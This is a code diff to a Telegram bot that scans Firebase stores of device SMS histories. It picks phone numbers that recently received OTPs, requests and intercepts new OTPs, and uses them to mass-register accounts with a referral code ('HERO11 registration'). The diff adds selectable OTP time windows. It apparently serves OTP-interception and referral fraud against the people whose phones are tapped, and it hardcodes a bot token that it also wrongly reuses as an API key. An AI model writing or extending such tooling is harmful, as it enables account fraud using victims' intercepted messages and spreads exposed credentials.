@@ -28,10 +28,9 @@ if hasattr(time, "tzset"):
     time.tzset()
 
 IST = timezone(timedelta(hours=5, minutes=30))
-BOT_START_IST = datetime.now(IST)
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM").strip()
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8337013809"))
-SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "RqHPFHbQCNwItxqfh21kDmH0Sx2bR0dBdDH1P9QLuFU6hspmbsQIYzxZ5DOURVbg").strip()
+SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM").strip()
 OTP_TIMEOUT = 25
 POLL_INTERVAL = 2
 TIMEOUT = 30
@@ -244,7 +243,7 @@ def decode_firebase_push_id(push_id: str):
 
 def resolve_message_dt(time_val, msg_key: str = "", ref_now: datetime = None):
     if ref_now is None:
-        ref_now = BOT_START_IST
+        ref_now = datetime.now(IST)
     dt = None
 
     try:
@@ -314,12 +313,16 @@ def resolve_message_dt(time_val, msg_key: str = "", ref_now: datetime = None):
 
     return dt
 
-def has_otp_in_last_10m_from_start(msgs) -> bool:
-    """Returns True only if at least 1 message with an OTP pattern arrived within the last 10 minutes from BOT_START_IST."""
+def has_otp_within_window(msgs, window_minutes: int) -> bool:
+    """Checks the device's chat history and returns True only if at least 1 OTP pattern message arrived within window_minutes."""
     if not isinstance(msgs, dict) or not msgs:
         return False
-    cutoff = BOT_START_IST - timedelta(minutes=10)
+    now_ist = datetime.now(IST)
+    cutoff = now_ist - timedelta(minutes=window_minutes)
+
     for m_key, m_val in msgs.items():
+        if not isinstance(m_val, dict):
+            continue
         if not message_has_otp_pattern(m_val):
             continue
         raw_time = (
@@ -335,8 +338,8 @@ def has_otp_in_last_10m_from_start(msgs) -> bool:
                 if any(w in str(k).lower() for w in ["time", "date", "stamp"]):
                     raw_time = v
                     break
-        msg_dt = resolve_message_dt(raw_time, msg_key=m_key, ref_now=BOT_START_IST)
-        if msg_dt is not None and cutoff <= msg_dt <= BOT_START_IST + timedelta(minutes=1):
+        msg_dt = resolve_message_dt(raw_time, msg_key=m_key, ref_now=now_ist)
+        if msg_dt is not None and cutoff <= msg_dt <= now_ist + timedelta(minutes=2):
             return True
     return False
 
@@ -532,7 +535,9 @@ def get_main_menu():
          InlineKeyboardButton(text="🔢 Scan All Numbers by ID", callback_data="scan_id_numbers_menu")],
         [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
          InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
-        [InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
+        [InlineKeyboardButton(text="🚀 Start (OTP < 10m)", callback_data="start_auto_10"),
+         InlineKeyboardButton(text="🚀 Start (OTP < 1h)", callback_data="start_auto_60")],
+        [InlineKeyboardButton(text="🚀 Start (OTP < 24h)", callback_data="start_auto_1440")]
     ])
 
 class LiveLogger:
@@ -1017,7 +1022,7 @@ async def cb_stop_automation(callback: types.CallbackQuery):
     await callback.message.answer("🛑 <b>Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
-@dp.callback_query(F.data == "start_automation")
+@dp.callback_query(F.data.startswith("start_auto_"))
 async def cb_start_automation(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
@@ -1028,8 +1033,24 @@ async def cb_start_automation(callback: types.CallbackQuery):
         await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
         return
 
+    try:
+        window_minutes = int(callback.data.split("_")[-1])
+    except Exception:
+        window_minutes = 10
+
+    window_labels = {
+        10: "last 10 min",
+        60: "past 1 hr",
+        1440: "last 24 hrs",
+    }
+    window_label = window_labels.get(window_minutes, f"last {window_minutes}m")
+
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Scan Started!</b> Picking unregistered numbers with OTP pattern in last 10m from bot start...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer(
+        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Checking device chat histories for OTP pattern in {html.escape(window_label)}...",
+        parse_mode="HTML",
+        reply_markup=get_main_menu()
+    )
 
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -1059,10 +1080,10 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                     continue
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     try:
-                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as m_req:
+                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=50', timeout=6) as m_req:
                                             msgs = await m_req.json()
 
-                                        if not has_otp_in_last_10m_from_start(msgs):
+                                        if not has_otp_within_window(msgs, window_minutes):
                                             skipped_cids.add(cid)
                                             continue
 
@@ -1082,7 +1103,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Scan complete: No unregistered numbers with OTP pattern in last 10m from bot start. Retrying in 5s...")
+                    await logger.set_text(f"🔴 Scan complete: No unregistered numbers with OTP pattern in {window_label}. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
@@ -1093,7 +1114,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 phone = target["phone"]
                 used_phones.add(phone)
 
-                await logger.set_text(f"🎯 [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
+                await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
                 async with aiohttp.ClientSession() as session:
                     known_keys = set()
@@ -1112,7 +1133,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         skipped_phones.add(phone)
                         continue
 
-                    await logger.set_text(f"🎯 [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
+                    await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
 
                     otp_found = None
                     start_poll = time.time()
@@ -1170,6 +1191,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 final_msg = (
                     f"🎉 <b>HERO11 REGISTRATION COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"⏱️ <b>Filter Window:</b> OTP in {html.escape(window_label)}\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
                     f"📱 <b>Exact Registered Numbers & DB Source:</b>\n{numbers_list_str}\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
